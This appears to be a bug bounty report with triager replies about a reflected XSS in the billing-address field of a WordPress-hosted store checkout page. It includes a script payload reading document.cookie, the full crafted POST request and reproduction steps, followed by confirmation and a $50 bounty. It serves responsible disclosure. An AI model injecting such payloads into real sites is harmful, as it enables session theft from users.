title: xss - reflected
vulnerability_information:
vulnerable url:  http://masterplan.wordpress.net/store/checkout/

payload:  1 Main Streetzbn0b\"><script>alert(document.cookie)</script>k8ez0

vulnerable parameter: billing-address

Request:

POST /store/checkout/ HTTP/1.1
Host: masterplan.wordpress.net
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: http://masterplan.wordpress.net/store/checkout/
Content-Type: application/x-www-form-urlencoded
Content-Length: 814
Cookie: PHPSESSID=a040c364fca0ec1d75201d8aaee61546; wordpress_test_cookie=WP+Cookie+check

billing%5baddress%5d=1%20Main%20Streetzbn0b%22%3e%3cscript%3ealert(document.cookie)%3c%2fscript%3ek8ez0&shipping%5bzip%5d=36310&billing%5bcountry%5d=AR&shipping%5baddress2%5d=1+Main+Street&payment%5bcardNumber%5d=555-555-0199@example.com&shipping%5bfirstName%5d=Peter&billing%5blastName%5d=Winter&shipping%5bcountry%5d=AR&payment%5bcardExpirationYear%5d=2018&billing%5bcity%5d=Winterville&billing%5bzip%5d=36310&shipping%5bcity%5d=Winterville&billing%5baddress2%5d=1+Main+Street&shipping%5blastName%5d=Winter&payment%5bsecurityId%5d=555-555-0199@example.com&shipping%5baddress%5d=1+Main+Street&payment%5bcardExpirationMonth%5d=01&payment%5bphone%5d=555-555-0199&payment%5bcardType%5d=Mastercard&billing%5bfirstName%5d=Peter&phpurchase-action=paypalprocheckout&sameAsBilling=on&payment%5bemail%5d=winter@example.com


Steps to reproduce:

1. get the request in burp repeater
2. see the response in browser
3. it will prompt you the session id.

## Impact

https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)

Steps to reproduce:

https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)

activities.message:
Hello Arun,

Thank you for the reports. I was unable to reproduce the XSS as you described above. My suspicion is that this is because I have no items in my "cart" that I'm attempting to "checkout". I see in the XSS report's attached image, you were able to actually add products to your cart for the checkout process to work with.

If you could share with us the URL or process where you were able to add the "USB sticks" to your cart it would assist me in verifying your reports.

Thank you.
activities.markdown_message:
Hello Arun,

Thank you for the reports. I was unable to reproduce the XSS as you described above. My suspicion is that this is because I have no items in my "cart" that I'm attempting to "checkout". I see in the XSS report's attached image, you were able to actually add products to your cart for the checkout process to work with.

If you could share with us the URL or process where you were able to add the "USB sticks" to your cart it would assist me in verifying your reports.

Thank you.

activities.message:
Hello again Arun,

I was able to identify the page which allowed me to add items to the "cart" for this website, and was able to verify and confirm the XSS vulnerabilities you reported as legitimate.

The severity for this report was marked as low-priority, as you have found a XSS vulnerability web-property under *.wordpress.net which is not in current use. The vulnerabilities you reported do exist, but it's potential risk is extremely low as there would be noone with escalated privileges to target with this type of attack to pivot or gain further access. If you believe this attack could be pivoted easily or combined with other vulnerabilities to increase severity, please feel free to fill me in.

Thank you again for the reports regarding masterplan.wordpress.net, this appears to be a domain that's been long forgotten, and has been harboring insecurities. Kudos for finding and reporting these to the team. Your findings on this domain has lead us to the conclusion that this site will be shut down, this was decided after your first reports last week, and there is no further need for you to scan or report vulnerabilities on this domain. Regardless of any further vulnerabilities you find or report on this domain, the site will be shut down.

activities.message:
Hello Arun,

We will be closing this ticket out as completed and valid.  We will be recommending a $50 bounty for these findings (which you can use to buy swag at https://mercantile.wordpress.org/  if you really wanted to, or buy whatever you want, it's your money now) 

Thank you again for the reported findings, and helping us out.
activities.markdown_message:
Hello Arun,

We will be closing this ticket out as completed and valid. We will be recommending a $50 bounty for these findings (which you can use to buy swag at https://mercantile.wordpress.org/ if you really wanted to, or buy whatever you want, it's your money now)

Thank you again for the reported findings, and helping us out.
